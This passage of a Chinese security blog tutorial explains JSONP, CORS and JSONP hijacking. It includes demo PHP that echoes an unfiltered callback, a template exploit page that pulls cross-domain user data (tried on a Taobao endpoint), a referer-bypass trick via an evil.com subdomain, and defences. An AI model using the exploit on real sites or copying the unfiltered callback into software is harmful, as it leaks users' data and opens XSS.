[<br>\"西电教务处\",<br>\"西电睿思\",<br>\"西电迎新网\",<br>\"西电图书馆\",<br>\"西电研究生\",<br>\"西电研究生系统\",<br>\"西电研究生院\",<br>\"西电信息化建设处\",<br>\"西电电院\",<br>\"西电就业信息网\"<br>]<br>&#125;<br>)<br></code></pre></td></tr></table></figure>\n\n<p>s 其实就是搜索结果的匹配项，而 cb 这个参数就是请求资源后的回调函数。</p>\n<h3 id=\"3-2-JSONP-实现-ajax-的跨域请求\"><a href=\"#3-2-JSONP-实现-ajax-的跨域请求\" class=\"headerlink\" title=\"3.2 JSONP 实现 ajax 的跨域请求\"></a>3.2 JSONP 实现 ajax 的跨域请求</h3><p>我们知道，原生 Js 的 ajax 异步请求是有同源策略所限制的，但是有了 JSONP，我们便可以实现跨域请求。</p>\n<p>接下来我们构造另一个域的生成 json 内容的 php 文件进行异步加载。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">//127.0.0.1:8086/test.php</span><br><span class=\"hljs-meta\">&lt;?php</span><br>$data = <span class=\"hljs-keyword\">array</span>(<br>    <span class=\"hljs-string\">'age'</span>=&gt;<span class=\"hljs-number\">20</span>,<br>    <span class=\"hljs-string\">'name'</span>=&gt;<span class=\"hljs-string\">'rt95'</span><br>);<br>$callback = $_GET[<span class=\"hljs-string\">'callback'</span>];<br><br><span class=\"hljs-keyword\">echo</span> $callback.<span class=\"hljs-string\">\"(\"</span>.json_encode($data).<span class=\"hljs-string\">\")\"</span>;<br><span class=\"hljs-keyword\">return</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">//127.0.0.1/frametest/test.html<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"jquery.min.js\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">\"utf-8\"</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"content\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">handler</span>(<span class=\"hljs-params\">data</span>) </span>&#123;<br>            <span class=\"hljs-keyword\">var</span> p = $(<span class=\"hljs-string\">'p#content'</span>);<br>            p.html(<span class=\"hljs-string\">'name : '</span> + data.name + <span class=\"hljs-string\">'&lt;br&gt;'</span> + <span class=\"hljs-string\">'age : '</span> + data.age);<br>        &#125;<br>        $(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            $.ajax(&#123;<br>                <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">'GET'</span>,<br>                <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">'http://127.0.0.1:8086/test.php'</span>,<br>                <span class=\"hljs-attr\">dataType</span>: <span class=\"hljs-string\">'jsonp'</span>,<br>                <span class=\"hljs-attr\">jsonp</span>: <span class=\"hljs-string\">'callback'</span>, <span class=\"hljs-comment\">// 请求 php 的参数名</span><br>                <span class=\"hljs-attr\">jsonpCallback</span>: <span class=\"hljs-string\">'handler'</span> <span class=\"hljs-comment\">// 回调函数名 </span><br>            &#125;);<br>        &#125;);<br>    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>运行文件！走你～你是不是发现了报错？长下面这样：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/13.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"13.png\"></p>\n<p>我们可以看到是被 CORS 这个规则给阻止了，那，什么是 CORS 呢？</p>\n<h3 id=\"3-3-CORS-跨域资源共享\"><a href=\"#3-3-CORS-跨域资源共享\" class=\"headerlink\" title=\"3.3 CORS (跨域资源共享)\"></a>3.3 CORS (跨域资源共享)</h3><blockquote>\n<p>如果浏览器支持HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。</p>\n<p>CORS全称Cross-Origin Resource Sharing，是HTML5规范定义的如何跨域访问资源。</p>\n</blockquote>\n<p>首先，我们需要了解：</p>\n<p>Origin 表示的是本域，就是浏览器当前页面的域。我们看图说话：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/14.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"14.png\"></p>\n<p>假如我们的本域是 my.com ，待请求的外域为 sina.com，那么只要服务器端的响应头的 <strong>Access-Control-Allow-Origin</strong> 字段有我们的本域，亦或是通配符 * ，本次请求就可以成功。</p>\n<p>像 POST ，GET 这样的简单请求只需验证这个字段即可，但是像 PUT，DELETE 等请求，在发送 ajax 之前，浏览器还会先发出一个 OPTION 请求，类似下面这样：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">OPTIONS</span> <span class=\"hljs-string\">/path/to/resource</span> HTTP/1.1<br><span class=\"hljs-attribute\">Host</span>: bar.com<br><span class=\"hljs-attribute\">Origin</span>: http://my.com<br><span class=\"hljs-attribute\">Access-Control-Request-Method</span>: POST<br></code></pre></td></tr></table></figure>\n\n<p>服务器端会给出允许响应的请求类型：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\">HTTP/1.1 <span class=\"hljs-number\">200</span> OK<br><span class=\"hljs-attribute\">Access-Control-Allow-Origin</span>: http://my.com<br><span class=\"hljs-attribute\">Access-Control-Allow-Methods</span>: POST, GET, PUT, OPTIONS<br><span class=\"hljs-attribute\">Access-Control-Max-Age</span>: 86400<br></code></pre></td></tr></table></figure>\n\n<p>如果我们刚开始的请求是在字段 <strong>Access-Control-Allow-Methods</strong> 里面，那么浏览器就会继续发送 ajax 请求，否则会抛出错误，终止操作。</p>\n<p>有了这些知识，我们就可以很轻松的解决上面的问题了。修改一下服务端的脚本，添加返回头的 <strong>Access-Control-Allow-Origin</strong> 字段。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>header(<span class=\"hljs-string\">\"Access-Control-Allow-Origin:*\"</span>);<br>$data = <span class=\"hljs-keyword\">array</span>(<br>    <span class=\"hljs-string\">\"age\"</span>=&gt;<span class=\"hljs-number\">20</span>,<br>    <span class=\"hljs-string\">\"name\"</span>=&gt;<span class=\"hljs-string\">'rt95'</span><br>);<br>$callback = $_GET[<span class=\"hljs-string\">'callback'</span>];<br><span class=\"hljs-keyword\">echo</span> $callback.<span class=\"hljs-string\">\"(\"</span>.json_encode($data).<span class=\"hljs-string\">\")\"</span>;<br><span class=\"hljs-keyword\">return</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/15.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"15.png\"></p>\n<p>这里有两个点需要注意下：</p>\n<ul>\n<li>dataType 的 T 是大写，一定要注意！！</li>\n<li>请求界面一定要给返回页面中调用 callback 指定的函数，具体实现根据不同需要而定。</li>\n</ul>\n<h2 id=\"4-JSONP-的劫持\"><a href=\"#4-JSONP-的劫持\" class=\"headerlink\" title=\"4@ JSONP 的劫持\"></a>4@ JSONP 的劫持</h2><h3 id=\"4-1-漏洞原理\"><a href=\"#4-1-漏洞原理\" class=\"headerlink\" title=\"4.1 漏洞原理\"></a>4.1 漏洞原理</h3><p>介绍了这么多知识，接下来我们就来介绍如何具体利用这个可能的漏洞点。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/16.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"16.png\"></p>\n<p>其实上面这张图已经十分清晰的展示了 JSONP 的利用过程。</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">用户注册网站 B <span class=\"hljs-comment\">-----&gt;</span><br>用户访问网站 A <span class=\"hljs-comment\">-----&gt;</span><br>A 网站的恶意脚本功能是通过注册 Callback 函数来像 B 网站发起请求,获得用户在 B 上的信息 <span class=\"hljs-comment\">-----&gt;</span><br>B 网站未做请求检测，返回用户数据 <span class=\"hljs-comment\">-----&gt;</span><br>数据上传至攻击者服务器<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-2-漏洞危害\"><a href=\"#4-2-漏洞危害\" class=\"headerlink\" title=\"4.2 漏洞危害\"></a>4.2 漏洞危害</h3><blockquote>\n<p><strong>JSONP是一种敏感信息泄露的漏洞</strong>，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，<strong>网站中包含其他网站的JSONP漏洞利用代码</strong>，将链接通过邮件等形式推送给受害人，<strong>如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，</strong>这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p>\n</blockquote>\n<h3 id=\"4-3-漏洞利用\"><a href=\"#4-3-漏洞利用\" class=\"headerlink\" title=\"4.3 漏洞利用\"></a>4.3 漏洞利用</h3><p>要想利用 JSONP 漏洞，必须找到存在漏洞的接口，这个接口必须满足以下三个条件：</p>\n<ul>\n<li>泄露出了敏感的信息，如 email,username,严重甚至 token。</li>\n<li>未检测 referer（可以绕过 HTML5 的 CORS 策略），或者验证方式不太严谨，正则写的不完善等等，譬如设置验证的 referer 为 <code>http://www.xxx.com</code>, 但是<code>http://www.xxx.com.evil.com</code> 依旧可以绕过限制。</li>\n<li>未启用 token 验证。</li>\n</ul>\n<h4 id=\"寻找方法\"><a href=\"#寻找方法\" class=\"headerlink\" title=\"寻找方法\"></a>寻找方法</h4><p>我们可以使用如下方法来初步粗略的寻找可能存在漏洞的接口。</p>\n<p>1、打开浏览器控制台的 Preseve log ,防止之前找到的结果被刷新的页面覆盖。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/17.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"17.png\"></p>\n<p>2、手动通过关键词筛选一些信息，搜索一些关键词，譬如 <code>callback</code>,<code>jsonp</code> 等，然后以此点进（确实慢，而且效率不高）。</p>\n<p>3、这里以淘宝为例，我找到了一个没什么利用价值的页面，只是用来实现整个过程。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/18.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"18.png\"></p>\n<p>4、通过构造恶意代码，诱使登陆的用户访问，然后获得数据。（这里淘宝这个页面确实没做特殊的过滤和访问控制，可能是因为数据没什么利用价值）</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"jquery.min.js\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">\"utf-8\"</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"content\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> 【回调函数名】(<span class=\"hljs-params\">data</span>) </span>&#123;<br>            <span class=\"hljs-keyword\">var</span> p = $(<span class=\"hljs-string\">'p#content'</span>);<br>            p.html(<span class=\"hljs-string\">'ip : '</span> + data.data.ip + <span class=\"hljs-string\">'&lt;br&gt;'</span> + <span class=\"hljs-string\">' region：'</span> + data.data.region + <span class=\"hljs-string\">'&lt;br&gt;'</span> + <span class=\"hljs-string\">' city: '</span> + data.data.city);<br>        &#125;<br>        $(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            $.ajax(&#123;<br>                <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">'GET'</span>,<br>                <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">'接口名'</span>,<br>                <span class=\"hljs-attr\">dataType</span>: <span class=\"hljs-string\">'jsonp'</span>,<br>                <span class=\"hljs-attr\">jsonp</span>: <span class=\"hljs-string\">'callback'</span>, <span class=\"hljs-comment\">// 请求 php 的参数名</span><br>                <span class=\"hljs-attr\">jsonpCallback</span>: <span class=\"hljs-string\">'回调函数名'</span> <span class=\"hljs-comment\">// 回调函数名 </span><br>            &#125;);<br>        &#125;);<br>    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/19.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"19.png\"></p>\n<p>可以看到，数据已经跨域访问，并且输出到了页面上面，如果是敏感数据，危害确实是巨大的。</p>\n<p>为了避免手动傻瓜寻找，我们可以编写爬虫脚本来自动化测试。</p>\n<blockquote>\n<p>（1）Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；</p>\n<p>（2）Proxy：用于代理所有的请求，过滤出所有包含敏感信息的<a href=\"http://www.infosec-wiki.com/?tag=jsonp\" target=\"_blank\" rel=\"noopener\">JSONP</a>请求，并记录下HTTP请求；</p>\n<p>（3）验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</p>\n</blockquote>\n<p>引用的工具作者将工具放到了<a href=\"https://github.com/qiaofei32/jsonp_info_leak\" target=\"_blank\" rel=\"noopener\">这</a>。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/20.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"20.png\"></p>\n<p>可以看到，速度和效率确实高出不少，但是还是需要一定程度的人工筛选。</p>\n<h3 id=\"4-4-漏洞防御\"><a href=\"#4-4-漏洞防御\" class=\"headerlink\" title=\"4.4 漏洞防御\"></a>4.4 漏洞防御</h3><p>这个漏洞乍看起来利用起来很难。没错，随着网站开发者的安全意识的提升，接口过滤会愈来愈多，但是目前来看还是有很多存在缺陷的接口。想想，如果有个 xss 可利用，拿到 token 之类的数据， jsonp 的防御是否还是坚不可摧呢？</p>\n<p>这里我们再补充一点，当服务端出现如下配置时，就算满足条件，服务端也会拒绝返回数据：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">header(<span class=\"hljs-string\">\"Access-Control-Allow-Origin: *\"</span>);<br>header(<span class=\"hljs-string\">\"Access-Control-Allow-Credentials: true\"</span>);<br></code></pre></td></tr></table></figure>\n\n<p>其中：</p>\n<blockquote>\n<p>对应客户端的 <code>xhrFields.withCredentials: true</code> 参数，服务器端通过在响应 header 中设置 <code>Access-Control-Allow-Credentials = true</code> 来运行客户端携带证书式访问。通过对 Credentials 参数的设置，就可以保持跨域 Ajax 时的 Cookie</p>\n</blockquote>\n<h3 id=\"补充（跨域-ajax-带-cookie-的问题）\"><a href=\"#补充（跨域-ajax-带-cookie-的问题）\" class=\"headerlink\" title=\"补充（跨域 ajax 带 cookie 的问题）\"></a>补充（跨域 ajax 带 cookie 的问题）</h3><p>上面这段引用说到了在请求页面 ajax 必须带上参数 <code>withCredentials</code>,并设置其值为 <code>true。</code></p>\n<p>服务端也必须设置头部 <code>Access-Control-Allow-Credentials = true</code>。</p>\n<p>我们来做个实验：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">// 请求页面 本地 1234 端口<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"jquery.min.js\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">\"utf-8\"</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"content\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">jsonp407</span>(<span class=\"hljs-params\">data</span>) </span>&#123;<br>            <span class=\"hljs-keyword\">var</span> p = $(<span class=\"hljs-string\">'p#content'</span>);<br>\t\tp.html(<span class=\"hljs-string\">'name : '</span> + data.name + <span class=\"hljs-string\">'&lt;br&gt;'</span> + <span class=\"hljs-string\">' age：'</span> + data.age + <span class=\"hljs-string\">'&lt;br&gt;'</span> + <span class=\"hljs-string\">' cookie: '</span> + data.cookie);<br>        &#125;<br>        $(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            $.ajax(&#123;<br>                <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">'GET'</span>,<br>                <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">'http://SEVER_IP/test.php'</span>,<br>                <span class=\"hljs-attr\">dataType</span>: <span class=\"hljs-string\">'jsonp'</span>,<br>                <span class=\"hljs-attr\">jsonp</span>: <span class=\"hljs-string\">'callback'</span>, <span class=\"hljs-comment\">// 请求 php 的参数名</span><br>                <span class=\"hljs-attr\">jsonpCallback</span>: <span class=\"hljs-string\">'jsonp407'</span>, <span class=\"hljs-comment\">// 回调函数名</span><br>                <span class=\"hljs-attr\">xhrFields</span>: &#123;<br>                \t <span class=\"hljs-attr\">withCredentials</span>: <span class=\"hljs-literal\">true</span>   <span class=\"hljs-comment\">// 设置带 cookie 的参数为true</span><br>                &#125;<br>            &#125;);<br>        &#125;);<br>    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<p>然后在本地浏览器设置一个任意 cookie 值,这里我们本地浏览器在服务器页面下设置 cookie 值 localtest</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 跨域请求页面,远程服务器 80 端口</span><br><span class=\"hljs-meta\">&lt;?php</span><br>header(<span class=\"hljs-string\">\"Access-Control-Allow-Origin: *\"</span>);<br>header(<span class=\"hljs-string\">\"Content-Type: application/json\"</span>);<br><span class=\"hljs-comment\">//header(\"Access-Control-Allow-Credentials: true\");</span><br>$cookie = $_COOKIE[<span class=\"hljs-string\">'localtest'</span>];<br>setcookie(<span class=\"hljs-string\">'rt95'</span>,<span class=\"hljs-string\">'123'</span>);<br>$cookie2 = $_COOKIE[<span class=\"hljs-string\">'rt95'</span>];<br>$data = <span class=\"hljs-keyword\">array</span>(<br>    <span class=\"hljs-string\">\"age\"</span>=&gt;<span class=\"hljs-number\">20</span>,<br>    <span class=\"hljs-string\">\"cookie\"</span>=&gt;$cookie,<br>    <span class=\"hljs-string\">\"name\"</span>=&gt;<span class=\"hljs-string\">'rt95'</span>,<br>    <span class=\"hljs-string\">\"cookie2\"</span>=&gt;$cookie2<br>);<br>$callback = $_GET[<span class=\"hljs-string\">'callback'</span>];<br><span class=\"hljs-keyword\">echo</span> $callback.<span class=\"hljs-string\">\"(\"</span>.json_encode($data).<span class=\"hljs-string\">\")\"</span>;<br><span class=\"hljs-keyword\">return</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>访问本地页面：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/21.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"21.png\"></p>\n<p>这里需要注意的是，服务端不设置 <code>Access-Control-Allow-Credentials</code> 字段的值也是可以传输 cookie 值的(本地跨域和远程跨域测试结果都是如此)，这与许多文档中描述不符，所以会在一定程度上降低攻击的难度。</p>\n<p>防御方法：</p>\n<ul>\n<li>接口处限制 referer 字段，设置随机 token 等。</li>\n<li>因为有直接利用 callback 函数进行的 xss攻击，我们还要严格控制编码，防止解析为 html ，要严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。</li>\n<li>严格过滤 callback 函数名及 JSON 里数据的输出。</li>\n<li>不要使用cookies来自定义JSONP响应。</li>\n<li>在 JSONP 响应中不要加入用户的个人敏感数据。</li>\n<li>严谨配置 Access-Control-Allow-Origin 